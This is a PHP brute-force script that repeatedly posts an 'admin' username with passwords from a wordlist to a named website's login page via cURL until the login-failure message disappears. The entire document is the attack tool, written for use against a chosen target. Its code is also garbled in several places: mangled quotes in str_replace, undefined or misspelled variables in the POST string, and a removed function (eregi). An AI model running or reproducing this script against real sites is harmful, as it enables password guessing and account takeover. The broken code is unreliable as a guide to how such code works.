<?php
// configure the bruter with your scenario
$target = "http://www.darkmindz.com/login.php"; // your target.
$user = "admin"; // the user we are bruting
$user_field = "user_name"; // the username field name in form
$pass_field = "password"; // the password field name in form
$bad = "Wrong username or password"; // message if the user / pass was wrong
$list = "path_to_word_list"; // the path to your wordlist


// Set the time limit of executing the script to 0 - never
set_time_limit(0);

// star the normal cURL routine
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);

// The actual bruting process
foreach(file($list) as $line)
{
$word = str_replace(array("
", "
"), ', $line);
$postfields = "".user_field."=".$username."&".$pass_field."=".$word."";
curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields);
$res = curl_exec($ch);
if(!eregi($bad,$res))
{
die("Pass found, it is: {$word}"); // password found
}

}

// close cURL connection
curl_close($ch);

?>